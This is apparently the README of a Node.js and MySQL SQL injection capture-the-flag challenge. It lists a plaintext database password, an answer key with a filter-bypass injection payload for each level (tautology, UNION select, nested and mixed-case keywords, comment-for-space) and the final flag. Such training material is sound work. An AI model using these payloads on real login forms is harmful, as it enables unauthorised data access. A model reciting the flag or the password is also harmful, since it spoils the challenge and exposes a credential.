# SQLI Web CTF Challenge
 
It is a Web Based SQLI CTF Challenge.

## Development Stack

* Node Js
* MYSQL

## How to deploy/install
  1. Clone the Repository
  2. Create docker images using docker files.
  

# DB Connection Password

fJR3AvgmVyQtrTXp

## How to play/solve the challenge

Once to reach the login portal. Each portal has a specific filter. The bypass injections for each level are as follows:

1. Simple injection -  admin' or '1'='1 (regex added to prevent other types of queries; REGEX-[/^[A-za-z]{1,5}' or [A-Za-z0-9'=#]*$/g])

2. Union Injection - ' union select secret from secret_table#' (case check not required as table name has to be lower case)

3. Replaces union and select with blanks - ' uniunionon selselectect secret from secret_table# (secret_table check added)

4. Bans lower case and upper case sql commands - ' UNiON SElECT secret FrOm secret_table# (blocked char)
5. Bans spaces -  '/\*\*/UNION/\*\*/SELECT/\*\*/secret/\*\*/FROM/\*\*/secret_table# (blocked char)
6. Submit the flag: 
    ```shell
    flag{nc-bug-bounty_t00k_y0u_l0ng_3n0ugh}
    ```

## Author
Aneesh Dua

SEL/**/ECT